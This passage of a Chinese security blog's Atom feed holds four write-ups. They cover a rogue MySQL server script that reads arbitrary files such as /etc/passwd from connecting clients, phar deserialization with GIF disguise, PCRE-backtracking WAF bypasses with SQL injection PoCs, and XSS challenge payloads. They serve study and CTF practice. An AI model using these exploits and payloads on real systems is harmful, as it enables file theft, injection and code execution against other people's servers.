&quot;0.0.0.0&quot; # open for eeeeveryone! ^_^</span><br><span class="line">PORT = 3306</span><br><span class="line">BUFFER_SIZE = 1024</span><br><span class="line"></span><br><span class="line">#1 Greeting</span><br><span class="line">greeting = &quot;\x5b\x00\x00\x00\x0a\x35\x2e\x36\x2e\x32\x38\x2d\x30\x75\x62\x75\x6e\x74\x75\x30\x2e\x31\x34\x2e\x30\x34\x2e\x31\x00\x2d\x00\x00\x00\x40\x3f\x59\x26\x4b\x2b\x34\x60\x00\xff\xf7\x08\x02\x00\x7f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x68\x69\x59\x5f\x52\x5f\x63\x55\x60\x64\x53\x52\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00&quot;</span><br><span class="line">#2 Accept all authentications</span><br><span class="line">authok = &quot;\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00&quot;</span><br><span class="line"></span><br><span class="line">#3 Payload</span><br><span class="line">#数据包长度</span><br><span class="line">payloadlen = &quot;\x0c&quot;</span><br><span class="line">padding = &quot;\x00\x00&quot;</span><br><span class="line">payload = payloadlen + padding + &quot;\x01\xfb\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64&quot;</span><br><span class="line"># print(&quot;payload1:&quot;+payload)</span><br><span class="line">file = raw_input(&quot;file:&quot;)</span><br><span class="line">l = my_len(file) </span><br><span class="line">payload = l + padding + &quot;\x01\xfb&quot; + file</span><br><span class="line"></span><br><span class="line"># &quot;\x01\xfb\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64&quot;</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)</span><br><span class="line">s.bind((HOST, PORT))</span><br><span class="line">s.listen(1)</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    conn, addr = s.accept()</span><br><span class="line">    print &apos;Connection from:&apos;, addr</span><br><span class="line">    conn.send(greeting)</span><br><span class="line">    while True:</span><br><span class="line">        data = conn.recv(BUFFER_SIZE)</span><br><span class="line">        print &quot; &quot;.join(&quot;%02x&quot; % ord(i) for i in data)</span><br><span class="line">        conn.send(authok)</span><br><span class="line">        data = conn.recv(BUFFER_SIZE)</span><br><span class="line">        conn.send(payload)</span><br><span class="line">        print &quot;[*] Payload send!&quot;</span><br><span class="line">        data = conn.recv(BUFFER_SIZE)</span><br><span class="line">        if not data: break</span><br><span class="line">        print &quot;Data received:&quot;, data</span><br><span class="line">        break</span><br><span class="line">    # Don&apos;t leave the connection open.</span><br><span class="line">    conn.close()</span><br></pre></td></tr></table></figure></p><p>输入<code>phar://phar.gif/test.txt</code>。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;/a&gt;原理&lt;/h2&gt;&lt;p&gt;用户请求mysql_client端，client会连接mysql server服务器，mysql server服务器读取&lt;code&gt;phar
      
    
    </summary>
    
      <category term="杂货店" scheme="http://yoursite.com/categories/%E6%9D%82%E8%B4%A7%E5%BA%97/"/>
    
    
      <category term="other" scheme="http://yoursite.com/tags/other/"/>
    
  </entry>
  
  <entry>
    <title>phar反序列化漏洞</title>
    <link href="http://yoursite.com/2019/09/09/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2019/09/09/phar反序列化漏洞/</id>
    <published>2019-09-09T09:03:30.000Z</published>
    <updated>2019-09-09T09:03:30.978Z</updated>
    
    <content type="html"><![CDATA[<h2 id="phar文件结构"><a href="#phar文件结构" class="headerlink" title="phar文件结构"></a>phar文件结构</h2><p><strong>1.stub</strong><br>用来标志phar文件，格式为<code>xxx&lt;?php xxx; __HALT_COMPILER();?&gt;</code>，必须以<code>__HALT_COMPILER();?&gt;</code>来结尾。<br><strong>2.manifest</strong><br>用来描述phar文件的属性等，其中含有可以由用户自定义的序列化数据<code>meta-data</code>，也是该攻击的核心地方。<br><img src="/img/1568018586208.png" alt=""><br><strong>3.file contents</strong><br>被压缩内容<br><strong>4.signature</strong><br>签名，放在文件末尾</p><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>需要将php.ini的<code>phar.readonly</code>选项设置为<code>off</code>，才能生成phar文件<br>phar1.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class TestObject &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @unlink(&quot;phar.phar&quot;);</span><br><span class="line">    $phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub</span><br><span class="line">    $o = new TestObject();</span><br><span class="line">    $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest</span><br><span class="line">    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件</span><br><span class="line">    //签名自动计算</span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>setMetadata方法直接传入对象即可，后台会自动帮我们序列化。可以看到meta-data以序列化形式存储<br><img src="/img/1568018807153.png" alt=""><br>有序列化数据必然会有反序列化操作，php一大部分的文件系统函数在通过phar://伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下：<br><img src="/img/1568018856614.png" alt=""><br>通过demo测试一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">    class TestObject &#123;</span><br><span class="line">        public function __destruct() &#123;</span><br><span class="line">            echo &apos;Destruct called&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $filename = &apos;phar://phar.phar/test.txt&apos;;</span><br><span class="line">    file_get_contents($filename); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p><img src="/img/1568019777929.png" alt=""></p><h2 id="将phar伪造成其他格式的文件"><a href="#将phar伪造成其他格式的文件" class="headerlink" title="将phar伪造成其他格式的文件"></a>将phar伪造成其他格式的文件</h2><p>在前面分析phar的文件结构时可能会注意到，php识别phar文件是通过其文件头的stub，更确切一点来说是<code>__HALT_COMPILER();?&gt;</code>这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class TestObject &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@unlink(&quot;phar.phar&quot;);</span><br><span class="line">$phar = new Phar(&quot;phar.phar&quot;);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&quot;GIF89a&quot; . &quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub，增加gif文件头</span><br><span class="line">$o = new TestObject();</span><br><span class="line">$phar-&gt;setMetadata($o); //将自定义meta-data存入manifest</span><br><span class="line">$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件</span><br><span class="line">//签名自动计算</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>再改后缀名gif，就伪造成gif图片，并且依然可以成功反序列化<br><img src="/img/1568019789974.png" alt=""></p><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>1.phar文件能够上传到服务器端<br>2.文件操作函数的参数可控，且<code>:</code>、<code>/</code>、<code>phar</code>等特色字符没有被过滤</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">https://paper.seebug.org/680/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;phar文件结构&quot;&gt;&lt;a href=&quot;#phar文件结构&quot; class=&quot;headerlink&quot; title=&quot;phar文件结构&quot;&gt;&lt;/a&gt;phar文件结构&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;1.stub&lt;/strong&gt;&lt;br&gt;用来标志phar文件，格式为&lt;code
      
    
    </summary>
    
      <category term="web" scheme="http://yoursite.com/categories/web/"/>
    
    
      <category term="other" scheme="http://yoursite.com/tags/other/"/>
    
  </entry>
  
  <entry>
    <title>PHP利用PCRE回溯绕过正则表达式</title>
    <link href="http://yoursite.com/2019/09/07/PHP%E5%88%A9%E7%94%A8PCRE%E5%9B%9E%E6%BA%AF%E7%BB%95%E8%BF%87%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    <id>http://yoursite.com/2019/09/07/PHP利用PCRE回溯绕过正则表达式/</id>
    <published>2019-09-07T08:58:40.000Z</published>
    <updated>2019-09-07T08:58:40.343Z</updated>
    
    <content type="html"><![CDATA[<h2 id="正则匹配过程"><a href="#正则匹配过程" class="headerlink" title="正则匹配过程"></a>正则匹配过程</h2><p>PHP正则利用的是NFA（非确定性有限自动机）。<br>遇到<code>.*</code>或者<code>.+</code>：直接匹配字符串末尾，然后一个个回溯，与之后的模式比较<br>遇到<code>.*?</code>或者<code>.+?</code>：非贪婪模式，在匹配到符合的字符串，停止，由下一个模式匹配，下一个模式不符合，回溯，再有<code>.*?</code>匹配，直到下一个模式符合</p><h2 id="preg-match函数问题"><a href="#preg-match函数问题" class="headerlink" title="preg_match函数问题"></a>preg_match函数问题</h2><p>PHP为了防止拒绝服务攻击，设置了回溯上限次数为1000000，当回溯次数超过上限，preg_match函数会返回false，因此绕过waf</p><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>1.sql的waf<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (preg_match(&apos;/UNION.+?SELECT/is&apos;, $input)) &#123;</span><br><span class="line">die(&apos;SQL Injection&apos;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>非贪婪模式，可以用<code>/*aaa*/</code>绕过，poc：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$input = &quot;select * from users where id=-1 union/*&quot; . str_repeat(&apos;a&apos;, 1000000) . &quot;*/select 1,2,3&quot;;</span><br></pre></td></tr></table></figure></p><p>2.php的waf<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function is_php($data)&#123;  </span><br><span class="line">    return preg_match(&apos;/&lt;\?.*[(`;?&gt;].*/is&apos;, $data);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以在注释后添加n个a绕过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$input = &quot;&lt;?php phpinfo();//&quot; + str+repeat(&apos;a&apos;,1000000)</span><br></pre></td></tr></table></figure></p><ol><li>Nu1lCTF绕过<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (preg_match(&apos;/sleep|BENCHMARK|GET_LOCK|information_schema|into.+?outfile|into.+?dumpfile|\/\*.*\*\//is&apos;, $input)) &#123;</span><br><span class="line">die(&apos;Go out!!!&apos;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p>poc<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$input = &quot;select * from users into/*&quot; . str_repeat(&quot;a&quot;, 1000000) . &quot;*/outfile &apos;D://2.txt&apos;&quot;;</span><br></pre></td></tr></table></figure></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>三个关键点：preg_match，<code>*</code>或者<code>+</code>，注释绕过<br>当碰到这三个点，有很大机会可以绕过正则过滤</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;正则匹配过程&quot;&gt;&lt;a href=&quot;#正则匹配过程&quot; class=&quot;headerlink&quot; title=&quot;正则匹配过程&quot;&gt;&lt;/a&gt;正则匹配过程&lt;/h2&gt;&lt;p&gt;PHP正则利用的是NFA（非确定性有限自动机）。&lt;br&gt;遇到&lt;code&gt;.*&lt;/code&gt;或者&lt;code&gt;.
      
    
    </summary>
    
      <category term="安全" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="other" scheme="http://yoursite.com/tags/other/"/>
    
  </entry>
  
  <entry>
    <title>alert(1) to win wp</title>
    <link href="http://yoursite.com/2019/09/05/alert(1)%20to%20win%20wp/"/>
    <id>http://yoursite.com/2019/09/05/alert(1) to win wp/</id>
    <published>2019-09-05T12:46:46.000Z</published>
    <updated>2019-09-05T12:46:46.847Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-Warmup："><a href="#1-Warmup：" class="headerlink" title="1.Warmup："></a>1.Warmup：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  return &apos;&lt;script&gt;console.log(&quot;&apos;+s+&apos;&quot;);&lt;/script&gt;&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将用户输入字符串放入<code>console.log</code>中，可以通过闭合括号和注释，输出alert<br><code>&quot;);alert(1)//</code><br><a href="https://www.runoob.com/js/js-regexp.html" target="_blank" rel="noopener">js正则表达式</a></p><h2 id="2-Adobe："><a href="#2-Adobe：" class="headerlink" title="2.Adobe："></a>2.Adobe：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  s = s.replace(/&quot;/g, &apos;\\&quot;&apos;);</span><br><span class="line">  return &apos;&lt;script&gt;console.log(&quot;&apos; + s + &apos;&quot;);&lt;/script&gt;&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤了<code>&quot;</code>，通过<code>&lt;script&gt;</code>标签闭合<br>js的正则通过<code>//</code>斜杠包裹<br><code>&lt;/script&gt;&lt;script&gt;alert(1);&lt;/script&gt;</code></p><h2 id="3-JSON："><a href="#3-JSON：" class="headerlink" title="3.JSON："></a>3.JSON：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  s = JSON.stringify(s);</span><br><span class="line">  return &apos;&lt;script&gt;console.log(&apos; + s + &apos;);&lt;/script&gt;&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>JSON.stringfy函数，意思是将输入的数组或者对象转换为JSON字符串，也可以是字符串，会做相应的过滤<br><a href="https://www.runoob.com/js/js-json.html" target="_blank" rel="noopener">JSON</a><br>上一关payload可以通关<br><code>&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></p><h2 id="4-Markdown"><a href="#4-Markdown" class="headerlink" title="4.Markdown"></a>4.Markdown</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  var text = s.replace(/&lt;/g, &apos;&amp;lt;&apos;).replace(/&quot;/g, &apos;&amp;quot;&apos;);</span><br><span class="line">  // URLs</span><br><span class="line">  text = text.replace(/(http:\/\/\S+)/g, &apos;&lt;a href=&quot;$1&quot;&gt;$1&lt;/a&gt;&apos;);</span><br><span class="line">  // [[img123|Description]]</span><br><span class="line">  text = text.replace(/\[\[(\w+)\|(.+?)\]\]/g, &apos;&lt;img alt=&quot;$2&quot; src=&quot;$1.gif&quot;&gt;&apos;);</span><br><span class="line">  return text;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload1：<code>http://[[sb|/onclick=alert(1)&gt;]]</code><br>但不能通过<br>payload2：<code>[[t|http://onerror=alert(1)//]]</code></p><p>思路：payload1思路，外层为a标签，中间引入img标签可以闭合第一个href的双引号，使得我们可以逃逸字符串来控制标签中的内容，插入<code>&gt;</code>闭合a标签，从而触发xss。<br>payload2思路，外层为img标签，中间同样引入a标签闭合alt的双引号，标签中有其他字符串没关系，会被当成标签中没有的属性处理，on事件后有双引号，可以用<code>//</code>杀掉，从而触发xss。</p><p>总结：<br>标签中<code>/</code>：可以替换空格，隔开属性<br><code>//</code>：可以用来杀掉后面的双引号<br>标签不存在的英文，可以不用理会</p><h2 id="5-DOM"><a href="#5-DOM" class="headerlink" title="5.DOM"></a>5.DOM</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  // Slightly too lazy to make two input fields.</span><br><span class="line">  // Pass in something like &quot;TextNode#foo&quot;</span><br><span class="line">  var m = s.split(/#/);</span><br><span class="line"></span><br><span class="line">  // Only slightly contrived at this point.</span><br><span class="line">  var a = document.createElement(&apos;div&apos;);</span><br><span class="line">  a.appendChild(document[&apos;create&apos;+m[0]].apply(document, m.slice(1)));</span><br><span class="line">  return a.innerHTML;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用户可以任意添加子节点，text节点因为转义无法执行代码，属性节点语法错误不能添加，元素节点只能添加元素无法利用，添加注释节点，通过闭合标签，可以逃出注释执行代码<br><code>Comment#--&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code><br><a href="https://www.runoob.com/w3cnote/js-call-apply-bind.html" target="_blank" rel="noopener">js apply用法</a></p><h2 id="6-Callback"><a href="#6-Callback" class="headerlink" title="6.Callback"></a>6.Callback</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  // Pass inn &quot;callback#userdata&quot;</span><br><span class="line">  var thing = s.split(/#/); </span><br><span class="line"></span><br><span class="line">  if (!/^[a-zA-Z\[\]&apos;]*$/.test(thing[0])) return &apos;Invalid callback&apos;;</span><br><span class="line">  var obj = &#123;&apos;userdata&apos;: thing[1] &#125;;</span><br><span class="line">  var json = JSON.stringify(obj).replace(/&lt;/g, &apos;\\u003c&apos;);</span><br><span class="line">  return &quot;&lt;script&gt;&quot; + thing[0] + &quot;(&quot; + json +&quot;)&lt;/script&gt;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>前后两个字符串都没有过滤单引号，可以用单引号包裹，可以逃出json字符串，后面双引号用<code>//</code>杀掉，从而执行代码。<br><code>&#39;#&#39;;alert(1)//</code></p><h2 id="7-Skandia"><a href="#7-Skandia" class="headerlink" title="7.Skandia"></a>7.Skandia</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  return &apos;&lt;script&gt;console.log(&quot;&apos; + s.toUpperCase() + &apos;&quot;)&lt;/script&gt;&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将字符串转换为大写，直接alert是无法执行的，js函数是区分大小写的，那么可以把思路转换成通过标签，通过HTML实体编码来绕过，标签中的js代码可以通过实体编码绕过！<br><code>&lt;/script&gt;&lt;img src=1 onerror=&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116(1)&gt;</code><br>简单写了个转换脚本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s = &apos;alert&apos;</span><br><span class="line">for i in s:</span><br><span class="line">print(&apos;&amp;#&apos;+str(ord(i)),end=&quot;&quot;)</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;1-Warmup：&quot;&gt;&lt;a href=&quot;#1-Warmup：&quot; class=&quot;headerlink&quot; title=&quot;1.Warmup：&quot;&gt;&lt;/a&gt;1.Warmup：&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;t
      
    
    </summary>
    
      <category term="ctf" scheme="http://yoursite.com/categories/ctf/"/>
    
    
      <category term="other" scheme="http://yoursite.com/tags/other/"/>
    
  </entry>
  
</feed>
